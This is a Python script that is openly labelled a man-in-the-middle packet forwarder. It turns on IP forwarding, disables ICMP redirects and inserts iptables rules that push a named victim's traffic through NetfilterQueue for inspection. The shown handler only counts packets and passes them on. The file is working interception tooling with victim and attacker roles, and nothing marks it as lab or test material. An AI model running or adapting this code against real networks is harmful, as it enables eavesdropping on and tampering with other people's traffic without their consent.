#!/usr/bin/env python3

"""

MITM Packet Forwarder using NetfilterQueue

"""



from netfilterqueue import NetfilterQueue

from scapy.all import *

import os



class PacketForwarder:

    def __init__(self, victim_ip, server_ip, victim_mac, server_mac, interface):

        self.victim_ip = victim_ip

        self.server_ip = server_ip

        self.victim_mac = victim_mac

        self.server_mac = server_mac

        self.interface = interface

        self.attacker_mac = get_if_hwaddr(interface)

        self.packet_count = 0



        print(f"[*] NFQueue MITM Forwarder")

        print(f"[*] Victim: {victim_ip} ({victim_mac})")

        print(f"[*] Server: {server_ip} ({server_mac})")

        print(f"[*] Attacker: {self.attacker_mac}")



    def setup_kernel(self):

        """Enable IP forwarding and disable send_redirects"""

        print("[*] Configuring kernel settings...")

        os.system("sudo sysctl -w net.ipv4.ip_forward=1")

        os.system("sudo sysctl -w net.ipv4.conf.all.send_redirects=0")

        os.system(f"sudo sysctl -w net.ipv4.conf.{self.interface}.send_redirects=0")



    def setup_iptables(self):

        """Insert iptables rules"""

        print("[*] Setting up iptables rules...")

        self.rules = [

            f"iptables -I FORWARD -s {self.victim_ip} -j NFQUEUE --queue-num 0",

            f"iptables -I FORWARD -d {self.victim_ip} -j NFQUEUE --queue-num 0"

        ]

        for rule in self.rules:

            print(f"[+] {rule}")

            os.system(f"sudo {rule}")



    def remove_iptables(self):

        """Remove iptables rules"""

        print("[*] Removing iptables rules...")

        reverse_rules = [

            f"iptables -D FORWARD -s {self.victim_ip} -j NFQUEUE --queue-num 0",

            f"iptables -D FORWARD -d {self.victim_ip} -j NFQUEUE --queue-num 0"

        ]

        for rule in reverse_rules:

            os.system(f"sudo {rule}")



    def process_packet(self, packet):

        """Process packets from netfilter queue"""

        try:

            data = packet.get_payload()

            pkt = IP(data)

            self.packet_count += 1



            if self.packet_count % 100 == 0:

                print(f"[*] Processed {self.packet_count} packets")

            

            



            packet.accept()



        except Exception as e:

            print(f"[!] Error: {e}")

            packet.accept()



    def run(self):

        """Main runner function"""

        self.setup_kernel()

        self.setup_iptables()



        nfqueue = NetfilterQueue()

        nfqueue.bind(0, self.process_packet)



        print("[*] Starting NFQueue processing... Ctrl+C to stop")

        try:

            nfqueue.run()

        except KeyboardInterrupt:

            print(f"\n[*] Interrupted. Processed {self.packet_count} packets.")

        finally:

            print("[*] Cleaning up...")

            nfqueue.unbind()

            self.remove_iptables()

            print("[*] Done.")